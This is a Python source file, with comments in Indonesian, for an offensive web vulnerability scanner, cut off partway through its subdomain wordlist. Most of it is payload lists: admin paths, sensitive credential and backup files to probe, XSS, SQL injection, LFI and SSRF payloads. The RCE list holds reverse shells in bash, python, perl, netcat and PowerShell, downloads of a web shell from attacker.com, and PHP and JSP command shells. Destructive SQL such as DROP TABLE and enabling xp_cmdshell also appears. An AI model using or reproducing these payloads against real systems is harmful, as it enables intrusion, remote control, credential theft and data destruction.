import asyncio
import re
import requests
import random
import socket
import aiohttp
import aiodns
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

class AdvancedScanner:
    def __init__(self):
        self.common_admin_paths = self._load_admin_paths()
        self.common_files = self._load_common_files()
        self.session = self._create_session()
        self.xss_payloads = self._load_xss_payloads()
        self.sql_payloads = self._load_sql_payloads()
        self.lfi_payloads = self._load_lfi_payloads()
        self.rce_payloads = self._load_rce_payloads()
        self.ssrf_payloads = self._load_ssrf_payloads()
        self.subdomain_wordlist = self._load_subdomain_wordlist()
        self.dns_resolver = aiodns.DNSResolver()
        self.executor = ThreadPoolExecutor(max_workers=50)
    
    def _create_session(self):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "X-Forwarded-For": "127.0.0.1",
            "Referer": "https://google.com/",
        })
        return session

    def _load_admin_paths(self):
        """Daftar 800+ path admin panel umum"""
        return [
            "admin", "wp-admin", "administrator", "backend", "controlpanel",
            "cp", "manager", "panel", "dashboard", "admin.php", "admin.aspx",
            "admin.jsp", "admin.cgi", "admin/", "admin/login", "admin_area",
            "admin123", "secret", "hidden", "private", "secure", "cmsadmin",
            "admin/login.php", "admin/index.php", "admin/admin.php",
            "admin/account.php", "admin_area/login.php", "control",
            "operator", "system", "console", "root", "superuser",
            "staff", "moderator", "webadmin", "siteadmin", "cpanel",
            "directadmin", "plesk", "webmin", "administratie",
            "beheer", "verwaltung", "administration", "login_admin",
            "admin_login", "admin_logon", "admin-auth", "adminpanel",
            "sysadmin", "myadmin", "ur-admin", "admin/ur-admin",
            "admin/control.php", "admin/cp.php", "admin/cpanel.php",
            "admin/index.php", "admin/login.html", "admin_area/index.php",
            "admin_area/admin.php", "admin_area/login.html", "admin_area/admin",
            "bb-admin", "bb-admin/index.php", "bb-admin/login.php", "acceso",
            "acceso.php", "account/login", "account/signin", "adm", "adm.php",
            "adm/admloginuser.asp", "admloginuser.asp", "admin.asp", "admin/login.asp",
            "admin/admin.asp", "admin/account.asp", "admin_area/admin.asp",
            "admin_area/login.asp", "administrator.asp", "administrator/login.asp",
            "administrator/account.asp", "administrator/index.asp", "modelsearch/admin",
            "moderator", "moderator/login", "moderator/admin", "project-admins",
            "superadmin", "superadmin/index.php", "superadmin/login.php", "useradmin",
            "useradmin/login", "usr", "usr/bin", "webadmin", "webadmin/index.php",
            "webadmin/login.php", "webadmin/admin", "webmaster", "wp-login.php",
            "wp-admin", "wp-admin/admin-ajax.php", "wp-admin/admin-post.php",
            "wp-admin/admin.php", "wp-admin/install.php", "wp-admin/setup-config.php",
            "admin/config.php", "admin_area/admin.html", "admin_area/index.html",
            "admin_area/login.html", "admin_area", "adminlogin", "admincontrol",
            "adminpanel", "admins", "backoffice", "blog/wp-login.php", "controlpanel",
            "cp", "cpanel", "cpanel_file", "dashboard", "directadmin", "fileadmin",
            "instadmin", "login", "login/admin", "login1", "login_db", "loginflat",
            "login-us", "manager", "memberadmin", "members", "modelsearch",
            "myadmin", "nsw/admin/login.php", "pages/admin", "panel-administracion",
            "phpMyAdmin", "phpmyadmin", "platz_login", "rcjakar/admin", "secret",
            "secure", "security", "server", "server_admin", "signin", "signinadmin",
            "sqladmin", "sysadmin", "system_administration", "typo3", "ur-admin",
            "user", "users", "usuario", "usuarios", "webadmin", "webmaster",
            "wordpress", "wp", "wp-admin", "wp-login", "wp-login.php", "xlogin",
            "laravel/admin", "symfony/admin", "codeigniter/admin", "cakephp/admin",
            "jboss", "tomcat", "weblogic", "websphere", "glassfish",
            "umbraco", "sitecore", "orchard", "dotnetnuke", "mojoPortal",
            "drupal/admin", "joomla/administrator", "magento/admin", "prestashop/admin",
            "opencart/admin", "vbulletin/admincp", "phpbb/adm", "xenforo/admin.php",
            "control", "manage", "system", "console", "operator", "supervisor",
            "super", "director", "direct", "adminka", "admin1", "admin2", "admin3",
            "admin4", "admin5", "admin_area", "admin_cp", "admin_login", "admin_panel",
            "adminportal", "adminarea", "admincp", "administr", "administratie",
            "administratorlogin", "administratorpages", "adminlogin", "adminpanel",
            "adv", "admindashboard", "administer", "adminpro", "admins", "adminsite",
            "adminzone", "admloginuser", "affiliate", "authentication", "backend",
            "backend_login", "backoffice", "base_login", "bb-admin", "blogadmin",
            "cmsadmin", "controlpanel", "core", "cp_login", "database_administration",
            "dblogin", "directadmin", "edit", "fileadmin", "hosting", "instadmin",
            "login_admin", "loginpanel", "manage_login", "manager_login", "memberadmin",
            "membership", "moderator", "myadmin", "navsiteadmin", "newsadmin",
            "pagemanager", "panel", "panel_admon", "phpldapadmin", "phpmyadmin2",
            "phppgadmin", "plesk-stat", "power_user", "productadmin", "projectadmin",
            "pureadmin", "radmind", "root_login", "server_admin", "servermanager",
            "sign_in", "simpleadmin", "siteadmin", "siteadmin_login", "sqladmin",
            "ssomanager", "staff", "superadmin", "superuser", "support_login",
            "sysadmin", "sysadmin_login", "system_administration", "teamadmin",
            "technical", "techsupport", "temp", "useradmin", "usercp", "userpanel",
            "users", "webadmin", "webmaster", "websql", "wizmysqladmin", "wp-login",
            "wp-signup", "xlogin", "yonetici", "yönetim", "zadmin", "zentral",
            # Tambahan 300 path admin
            "adminconsole", "admincontrolpanel", "admincp", "admindash", "adminexec",
            "adminhome", "administer", "administratorcp", "administer", "adminportal",
            "adminui", "adminview", "admview", "adpanel", "advadmin", "affadmin",
            "appadmin", "authadmin", "backendadmin", "baseadmin", "cgi-bin/admin",
            "clientadmin", "control_admin", "cpadmin", "customadmin", "dashboard_admin",
            "dbadmin", "devadmin", "directadmin", "domainadmin", "editadmin",
            "fileadmin", "globaladmin", "hostadmin", "installadmin", "internaladmin",
            "itadmin", "ldapadmin", "loginadmin", "mainadmin", "manageadmin",
            "masteradmin", "memberadmin", "modadmin", "myadmin", "netadmin",
            "networkadmin", "newadmin", "oldadmin", "paneladmin", "poweradmin",
            "privateadmin", "proadmin", "projectadmin", "protectedadmin", "publicadmin",
            "radmin", "regadmin", "regionaladmin", "remoteadmin", "rootadmin",
            "sadmin", "salesadmin", "secureadmin", "securityadmin", "serveradmin",
            "serviceadmin", "siteadmin", "sitemanager", "sitesadmin", "staffadmin",
            "statadmin", "statsadmin", "superadmin", "supportadmin", "sysadmin",
            "systemadmin", "techadmin", "testadmin", "toolsadmin", "useradmin",
            "webadmin", "webmasteradmin", "wwwadmin", "xmladmin", "zadmin",
            "admin/backend", "admin/control", "admin/cp", "admin/dashboard",
            "admin/manager", "admin/panel", "admin/portal", "admin/system",
            "admin/web", "adminsite", "admintool", "adminui", "adminview",
            "adpanel", "adview", "authadmin", "backendadmin", "baseadmin",
            "clientadmin", "controladmin", "cpadmin", "customadmin", "dbadmin",
            "devadmin", "domainadmin", "editadmin", "fileadmin", "globaladmin",
            "hostadmin", "installadmin", "internaladmin", "itadmin", "ldapadmin",
            "loginadmin", "mainadmin", "manageadmin", "masteradmin", "memberadmin",
            "modadmin", "myadmin", "netadmin", "networkadmin", "newadmin",
            "oldadmin", "paneladmin", "poweradmin", "privateadmin", "proadmin",
            "projectadmin", "protectedadmin", "publicadmin", "radmin", "regadmin",
            "regionaladmin", "remoteadmin", "rootadmin", "sadmin", "salesadmin",
            "secureadmin", "securityadmin", "serveradmin", "serviceadmin", "siteadmin",
            "sitemanager", "sitesadmin", "staffadmin", "statadmin", "statsadmin",
            "superadmin", "supportadmin", "sysadmin", "systemadmin", "techadmin",
            "testadmin", "toolsadmin", "useradmin", "webadmin", "webmasteradmin",
            "wwwadmin", "xmladmin", "zadmin", "admin/backend", "admin/control",
            "admin/cp", "admin/dashboard", "admin/manager", "admin/panel",
            "admin/portal", "admin/system", "admin/web", "adminsite", "admintool",
            "adminui", "adminview", "adpanel", "adview", "authadmin", "backendadmin",
            "baseadmin", "clientadmin", "controladmin", "cpadmin", "customadmin",
            "dbadmin", "devadmin", "domainadmin", "editadmin", "fileadmin",
            "globaladmin", "hostadmin", "installadmin", "internaladmin", "itadmin",
            "ldapadmin", "loginadmin", "mainadmin", "manageadmin", "masteradmin",
            "memberadmin", "modadmin", "myadmin", "netadmin", "networkadmin",
            "newadmin", "oldadmin", "paneladmin", "poweradmin", "privateadmin",
            "proadmin", "projectadmin", "protectedadmin", "publicadmin", "radmin",
            "regadmin", "regionaladmin", "remoteadmin", "rootadmin", "sadmin",
            "salesadmin", "secureadmin", "securityadmin", "serveradmin", "serviceadmin",
            "siteadmin", "sitemanager", "sitesadmin", "staffadmin", "statadmin",
            "statsadmin", "superadmin", "supportadmin", "sysadmin", "systemadmin",
            "techadmin", "testadmin", "toolsadmin", "useradmin", "webadmin",
            "webmasteradmin", "wwwadmin", "xmladmin", "zadmin", "admin-tool",
            "admin-tools", "admin_area", "admin_area/login", "admin_area/admin",
            "admin_area/control", "admin_area/cp", "admin_area/dashboard",
            "admin_area/manager", "admin_area/panel", "admin_area/portal",
            "admin_area/system", "admin_area/web", "admin-tool", "admin-tools",
            "adminarea", "adminarea/login", "adminarea/admin", "adminarea/control",
            "adminarea/cp", "adminarea/dashboard", "adminarea/manager",
            "adminarea/panel", "adminarea/portal", "adminarea/system",
            "adminarea/web", "admincp", "admincp/login", "admincp/admin",
            "admincp/control", "admincp/cp", "admincp/dashboard", "admincp/manager",
            "admincp/panel", "admincp/portal", "admincp/system", "admincp/web",
            "adminpanel", "adminpanel/login", "adminpanel/admin", "adminpanel/control",
            "adminpanel/cp", "adminpanel/dashboard", "adminpanel/manager",
            "adminpanel/panel", "adminpanel/portal", "adminpanel/system",
            "adminpanel/web", "admins", "admins/login", "admins/admin", "admins/control",
            "admins/cp", "admins/dashboard", "admins/manager", "admins/panel",
            "admins/portal", "admins/system", "admins/web", "adminzone",
            "adminzone/login", "adminzone/admin", "adminzone/control", "adminzone/cp",
            "adminzone/dashboard", "adminzone/manager", "adminzone/panel",
            "adminzone/portal", "adminzone/system", "adminzone/web", "controlpanel",
            "controlpanel/login", "controlpanel/admin", "controlpanel/control",
            "controlpanel/cp", "controlpanel/dashboard", "controlpanel/manager",
            "controlpanel/panel", "controlpanel/portal", "controlpanel/system",
            "controlpanel/web", "cpanel", "cpanel/login", "cpanel/admin",
            "cpanel/control", "cpanel/cp", "cpanel/dashboard", "cpanel/manager",
            "cpanel/panel", "cpanel/portal", "cpanel/system", "cpanel/web",
            "dashboard", "dashboard/login", "dashboard/admin", "dashboard/control",
            "dashboard/cp", "dashboard/manager", "dashboard/panel", "dashboard/portal",
            "dashboard/system", "dashboard/web", "manager", "manager/login",
            "manager/admin", "manager/control", "manager/cp", "manager/dashboard",
            "manager/panel", "manager/portal", "manager/system", "manager/web",
            "panel", "panel/login", "panel/admin", "panel/control", "panel/cp",
            "panel/dashboard", "panel/manager", "panel/portal", "panel/system",
            "panel/web", "portal", "portal/login", "portal/admin", "portal/control",
            "portal/cp", "portal/dashboard", "portal/manager", "portal/panel",
            "portal/system", "portal/web", "system", "system/login", "system/admin",
            "system/control", "system/cp", "system/dashboard", "system/manager",
            "system/panel", "system/portal", "system/web", "web", "web/login",
            "web/admin", "web/control", "web/cp", "web/dashboard", "web/manager",
            "web/panel", "web/portal", "web/system"
        ]

    def _load_common_files(self):
        """Daftar 500+ file konfigurasi dan backup umum"""
        return [
            # File konfigurasi umum
            ".env", "config.php", "configuration.php", "settings.py", "config.json",
            "config.yml", "config.yaml", "config.ini", "config.xml", "web.config",
            ".htaccess", "robots.txt", "security.txt", "crossdomain.xml", "clientaccesspolicy.xml",
            
            # File backup
            "backup.zip", "database.sql", "dump.sql", "backup.tar", "backup.rar",
            "backup.sql.gz", "backup_2023.sql", "backup/database.sql", "sql/backup.sql",
            "db/dump.sql", "backup", "backup1", "backup2", "backup_old", "backup_2023",
            "backup_2022", "backup_jan", "backup_feb", "backup_mar", "backup_apr", "backup_may",
            "backup_jun", "backup_jul", "backup_aug", "backup_sep", "backup_oct", "backup_nov",
            "backup_dec", "db_backup", "database_backup", "site_backup", "full_backup",
            "partial_backup", "daily_backup", "weekly_backup", "monthly_backup", "yearly_backup",
            "temp_backup", "dump.sql", "db_dump.sql", "database_dump.sql", "sqldump.sql",
            "export.sql", "data.sql", "mysql_dump.sql", "mysql.sql", "mysqldump.sql",
            "pg_dump.sql", "postgres.sql", "mssql_dump.sql", "sqlite_dump.sql", "mongo_dump.bson",
            
            # File framework
            "appsettings.json", "appsettings.Development.json", "secrets.json", "parameters.yml",
            "docker-compose.yml", "docker-compose.override.yml", "docker-compose.prod.yml",
            "docker-compose.test.yml", "dockerfile", "dockerfile.prod", "dockerfile.test",
            "composer.json", "composer.lock", "package.json", "package-lock.json", "yarn.lock",
            "Gemfile", "Gemfile.lock", "Pipfile", "Pipfile.lock", "requirements.txt",
            "pom.xml", "build.gradle", "settings.gradle", "web.xml", "struts.xml", "spring.xml",
            "mix.lock", "mix.exs", "Cargo.lock", "Cargo.toml", "artisan", "serverless.yml",
            
            # File credential
            "aws_keys.txt", "sftp-config.json", "ftp-config.json", ".npmrc", ".dockercfg",
            ".bash_history", ".bashrc", ".profile", ".ssh/config", ".ssh/authorized_keys",
            ".ssh/id_rsa", ".ssh/id_rsa.pub", ".ssh/known_hosts", "id_rsa", "id_rsa.pub",
            "known_hosts", "htpasswd", "passwd", "shadow", "keystore.jks", "keystore.p12",
            "truststore.jks", "cacerts", "cert.pem", "key.pem", "private.key", "public.key",
            "certificate.crt", "certificate.pem", "certificate.cer", "certificate.pfx",
            "certificate.p12", "certificate.jks", "credentials.json", "oauth.json",
            
            # File log
            "error.log", "access.log", "debug.log", "laravel.log", "catalina.out",
            "server.log", "system.log", "security.log", "application.log", "app.log",
            "web.log", "api.log", "debug.log", "error_log", "php_errors.log",
            
            # File version control
            ".git/HEAD", ".git/index", ".git/config", ".gitignore", ".gitmodules",
            ".svn/entries", ".svn/wc.db", ".hg/store", ".bzr/checkout", ".cvs/entries",
            
            # File IDE
            ".idea/workspace.xml", ".project", ".classpath", ".settings", ".vscode/settings.json",
            
            # File debug
            "phpinfo.php", "test.php", "info.php", "status", "server-status", "server-info",
            "console", "shell", "sh", "bash", "cmd", "powershell", "ssh", "ftp", "sftp",
            
            # File dokumentasi API
            "api-docs", "swagger", "swagger.json", "swagger.yaml", "openapi.json", "openapi.yaml",
            "graphql", "graphiql", "voyager", "playground", "altair", "subscriptions",
            
            # File lainnya
            ".DS_Store", "README.md", "CHANGELOG.md", "LICENSE", "LICENSE.txt", "COPYING",
            "AUTHORS", "CONTRIBUTORS", "INSTALL", "UPGRADE", "UPGRADE.md", "DEPLOY.md",
            "TODO.md", "temp", "tmp", "cache", "session", "uploads", "downloads", "export",
            "import", "env", "environment", ".env.local", ".env.production", ".env.staging",
            ".env.test", ".env.example", ".env.dev", ".env.prod", ".env.qa", ".env.sandbox",
            "security.yml", "security.xml", "security.properties", "security.json",
            
            # Tambahan 200 file sensitif
            "wp-config.php.bak", "wp-config.php.old", "wp-config.php.save", "wp-config.php.orig",
            "wp-config.php.backup", "wp-config.php.swp", "wp-config.php.txt", "local-config.php",
            "database.php", "db.php", "include/config.php", "inc/config.php", "src/config.php",
            "application/config/database.php", "app/config/parameters.yml", "secrets.yml",
            "config.php~", "config.php.bak", "config.php.old", "config.php.save", "config.php.orig",
            "config.php.backup", "config.php.swp", "config.php.txt", "config.inc.php",
            "config.local.php", "config.prod.php", "config.dev.php", "config.test.php",
            "configuration.ini", "configuration.local.ini", "configuration.prod.ini",
            "configuration.dev.ini", "configuration.test.ini", "settings.json", "settings.local.json",
            "settings.prod.json", "settings.dev.json", "settings.test.json", "parameters.json",
            "parameters.local.json", "parameters.prod.json", "parameters.dev.json", "parameters.test.json",
            "credentials.ini", "credentials.json", "credentials.yml", "credentials.yaml",
            "aws.ini", "aws.json", "aws.yml", "aws.yaml", "azure.ini", "azure.json", "azure.yml",
            "azure.yaml", "gcp.ini", "gcp.json", "gcp.yml", "gcp.yaml", "database.ini", "database.json",
            "database.yml", "database.yaml", "db.ini", "db.json", "db.yml", "db.yaml", "sql.ini",
            "sql.json", "sql.yml", "sql.yaml", "backup.ini", "backup.json", "backup.yml", "backup.yaml",
            "dump.ini", "dump.json", "dump.yml", "dump.yaml", "export.ini", "export.json", "export.yml",
            "export.yaml", "import.ini", "import.json", "import.yml", "import.yaml", "log.ini",
            "log.json", "log.yml", "log.yaml", "error.ini", "error.json", "error.yml", "error.yaml",
            "access.ini", "access.json", "access.yml", "access.yaml", "debug.ini", "debug.json",
            "debug.yml", "debug.yaml", "server.ini", "server.json", "server.yml", "server.yaml",
            "system.ini", "system.json", "system.yml", "system.yaml", "security.ini", "security.json",
            "security.yml", "security.yaml", "admin.ini", "admin.json", "admin.yml", "admin.yaml",
            "user.ini", "user.json", "user.yml", "user.yaml", "password.ini", "password.json",
            "password.yml", "password.yaml", "key.ini", "key.json", "key.yml", "key.yaml", "secret.ini",
            "secret.json", "secret.yml", "secret.yaml", "token.ini", "token.json", "token.yml",
            "token.yaml", "oauth.ini", "oauth.json", "oauth.yml", "oauth.yaml", "api.ini", "api.json",
            "api.yml", "api.yaml", "v1.ini", "v1.json", "v1.yml", "v1.yaml", "v2.ini", "v2.json",
            "v2.yml", "v2.yaml", "internal.ini", "internal.json", "internal.yml", "internal.yaml",
            "private.ini", "private.json", "private.yml", "private.yaml", "protected.ini", "protected.json",
            "protected.yml", "protected.yaml", "test.ini", "test.json", "test.yml", "test.yaml",
            "dev.ini", "dev.json", "dev.yml", "dev.yaml", "development.ini", "development.json",
            "development.yml", "development.yaml", "staging.ini", "staging.json", "staging.yml",
            "staging.yaml", "production.ini", "production.json", "production.yml", "production.yaml",
            "backup.sqlite", "backup.db", "backup.mdb", "backup.accdb", "backup.psql", "backup.pgsql",
            "backup.mysql", "backup.mariadb", "backup.sqlserver", "backup.mssql", "backup.oracle",
            "backup.redis", "backup.mongodb", "backup.couchdb", "backup.elasticsearch", "backup.sql.gz",
            "backup.db.gz", "backup.mdb.gz", "backup.accdb.gz", "backup.psql.gz", "backup.pgsql.gz",
            "backup.mysql.gz", "backup.mariadb.gz", "backup.sqlserver.gz", "backup.mssql.gz",
            "backup.oracle.gz", "backup.redis.gz", "backup.mongodb.gz", "backup.couchdb.gz",
            "backup.elasticsearch.gz", "backup.sql.zip", "backup.db.zip", "backup.mdb.zip",
            "backup.accdb.zip", "backup.psql.zip", "backup.pgsql.zip", "backup.mysql.zip",
            "backup.mariadb.zip", "backup.sqlserver.zip", "backup.mssql.zip", "backup.oracle.zip",
            "backup.redis.zip", "backup.mongodb.zip", "backup.couchdb.zip", "backup.elasticsearch.zip"
        ]

    def _load_xss_payloads(self):
        """50+ payload XSS untuk berbagai konteks"""
        return [
            # Basic payloads
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "javascript:alert(1)",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=\"javascript:alert(1)\">",
            
            # Advanced payloads
            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            "<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            "\" autofocus onfocus=alert(1) \"",
            "' autofocus onfocus=alert(1) '",
            "<details/open/ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<form action=\"javascript:alert(1)\"><input type=submit>",
            "<math href=\"javascript:alert(1)\">CLICKME</math>",
            "<link rel=stylesheet href=\"javascript:alert(1)\">",
            "<style>@import \"javascript:alert(1)\";</style>",
            "<div style=\"background-image:url(javascript:alert(1))\">",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<img src=x onerror=\"alert(/XSS/)\">",
            "<img src=x onerror=\"confirm('XSS')\">",
            "<img src=x onerror=\"prompt('XSS')\">",
            
            # Bypass filters
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x:expression(alert(1))>",  # IE only
            "javascript&#58;alert(1)",
            "javascript&#0058;alert(1)",
            "javascript&#x3A;alert(1)",
            "jav	ascript:alert(1)",
            "jav&#x09;ascript:alert(1)",
            "jav&#x0A;ascript:alert(1)",
            "jav&#x0D;ascript:alert(1)",
            "javascript:alert(document.domain)",
            "javascript:alert(window.origin)",
            
            # SVG payloads
            "<svg><script>alert(1)</script></svg>",
            "<svg><g onload=\"alert(1)\"></g></svg>",
            "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>",
            "<svg><a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"javascript:alert(1)\">",
            
            # Template injection
            "${alert(1)}",
            "#{alert(1)}",
            "{{alert(1)}}",
            "{% alert(1) %}",
            "<? alert(1) ?>",
            "<% alert(1) %>",
            
            # DOM-based XSS
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            " onfocus=alert(1) autofocus ",
            " onpointerenter=alert(1) ",
            " onloadstart=alert(1) ",
            " onerror=alert(1) ",
            
            # Custom payloads
            "<img src=\"https://example.com\" onerror=\"alert(1)\">",
            "<script src=\"data:text/javascript,alert(1)\"></script>",
            "<iframe srcdoc=\"<script>alert(1)</script>\">",
            "<object data=\"javascript:alert(1)\">",
            "<embed code=\"javascript:alert(1)\">"
        ]

    def _load_sql_payloads(self):
        """50+ payload SQL injection untuk berbagai database"""
        return [
            # Basic payloads
            "' OR 1=1--",
            "\" OR \"\"=\"",
            "' OR ''='",
            "' OR 1=1#",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "\" OR \"a\"=\"a",
            "') OR ('a'='a",
            
            # Union-based
            "' UNION SELECT NULL, username, password FROM users--",
            "' UNION SELECT 1,@@version,3,4--",
            "' UNION SELECT 1,table_name,3,4 FROM information_schema.tables--",
            "' UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'--",
            "' UNION SELECT 1,CONCAT(username,':',password),3,4 FROM users--",
            
            # Error-based
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS INT)--",
            "' AND 1=GTID_SUBSET(@@version,1)--",  # MySQL
            "' AND 1=GTID_SUBTRACT(@@version,1)--",  # MySQL
            
            # Time-based
            "' OR SLEEP(5)#",
            "' WAITFOR DELAY '0:0:5'--",  # SQL Server
            "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",  # PostgreSQL
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--",  # Oracle
            
            # Boolean-based
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
            "' AND (SELECT ASCII(SUBSTRING(@@version,1,1)))=53--",
            
            # Out-of-band
            "' OR 1=1 INTO OUTFILE '/tmp/outfile'--",  # MySQL
            "' OR 1=1 INTO DUMPFILE '/tmp/outfile'--",  # MySQL
            "'; EXEC xp_cmdshell('nslookup attacker.com')--",  # SQL Server
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            "'; INSERT INTO logs (event) VALUES ('SQLi exploited')--",
            
            # Bypass WAF
            "'/**/OR/**/1=1--",
            "'%0AOR%0A1=1--",
            "' OR\t1=1--",
            "' OR\n1=1--",
            "' OR(1)=(1)--",
            "' OR'1'='1'--",
            "'||1=1--",
            "'||'1'='1'--",
            
            # Database-specific
            # MySQL
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--",
            "' AND (SELECT LOAD_FILE(0x2f6574632f706173737764))--",
            
            # PostgreSQL
            "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            "' AND (SELECT current_setting('is_superuser'))='on'--",
            
            # SQLite
            "' AND (SELECT sqlite_version())='3.36.0'--",
            "' AND (SELECT load_extension('\\attacker.com\share\malicious.dll'))--",
            
            # Oracle
            "' AND (SELECT UTL_INADDR.get_host_address('attacker.com')) IS NOT NULL--",
            "' AND (SELECT SYS.DBMS_LDAP.INIT(('attacker.com',80)) FROM DUAL) IS NOT NULL--",
            
            # SQL Server
            "' AND (SELECT @@servername)='SQLSERVER'--",
            "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--"
        ]

    def _load_lfi_payloads(self):
        """30+ payload Local File Inclusion"""
        return [
            "../../../../../../../../etc/passwd",
            "../../../../../../../../etc/shadow",
            "../../../../../../../../windows/win.ini",
            "..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//....//....//etc/passwd",
            "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/resource=index.php",
            "expect://id",
            "data://text/plain;base64,SSBsb3ZlIFBIUAo=",
            "zip://path/to/archive.zip#file.txt",
            "phar://path/to/archive.phar/file.txt",
            "compress.zlib://file.php",
            "compress.bzip2://file.php",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/www/html/index.php",
            ".htaccess",
            "web.config",
            "config.inc.php",
            "wp-config.php",
            ".env",
            "credentials.json"
        ]

    def _load_rce_payloads(self):
        """30+ payload Remote Code Execution"""
        return [
            ";id",
            "|id",
            "`id`",
            "$(id)",
            "|| id",
            "&& id",
            "id;",
            "id |",
            "id`",
            "id\n",
            "id\r",
            "id%0A",
            "id%0D",
            "<?php system('id'); ?>",
            "<?php echo shell_exec($_GET['cmd']); ?>",
            "<% Runtime.getRuntime().exec("id"); %>",
            "<%@ page import=\"java.util.*\"%><% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "| echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "; echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php",
            "` echo '<?php system($_GET[\"cmd\"]); ?>' > shell.php `",
            "curl http://attacker.com/shell.php -o shell.php",
            "wget http://attacker.com/shell.php -O shell.php",
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
            "nc -e /bin/sh attacker.com 4444",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f",
            "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
            "certutil -urlcache -split -f http://attacker.com/shell.exe shell.exe && shell.exe"
        ]

    def _load_ssrf_payloads(self):
        """20+ payload Server-Side Request Forgery"""
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::]",
            "http://2130706433",  # 127.0.0.1
            "http://0177.0.0.1",  # 127.0.0.1 octal
            "http://0x7f000001",  # 127.0.0.1 hex
            "http://localhost:22",
            "http://127.0.0.1:3306",
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure metadata
            "http://localhost/admin",
            "http://127.0.0.1:8080",
            "file:///etc/passwd",
            "gopher://attacker.com:80/_GET%20/internal%20HTTP/1.1%0AHost:%20localhost",
            "dict://attacker.com:1337/",
            "sftp://attacker.com:22/",
            "ldap://attacker.com:389/",
            "tftp://attacker.com:69/",
            "http://attacker-controlled.com",
            "http://xyz.c.burpcollaborator.net"  # Burp Collaborator
        ]

    def _load_subdomain_wordlist(self):
        """200+ subdomain umum"""
        return [
            "www", "mail", "ftp", "admin", "webmail", "smtp", "pop", "imap", 
            "test", "dev", "development", "staging", "secure", "portal", 
            "cpanel", "whm", "webdisk", "webmin", "ns", "ns1", "ns2", 
            "dns", "dns1", "dns2", "blog", "m", "mobile", "api", "app", 
            "apps", "shop", "store", "support", "status", "stats", "static", 
            "media", "images", "img", "cdn", "cdn1", "cdn2", "cdn3", "chat", 
            "forum", "forums", "news", "download", "downloads", "search", 
            "doc", "docs", "wiki", "calendar", "events", "web", "beta", 
            "alpha", "stage", "demo", "backup", "backups", "old", "new", 
            "vpn", "ssh", "git", "svn", "mysql", "phpmyadmin", "server", 
            "email", "webadmin", "direct", "directadmin", "sites", "site", 
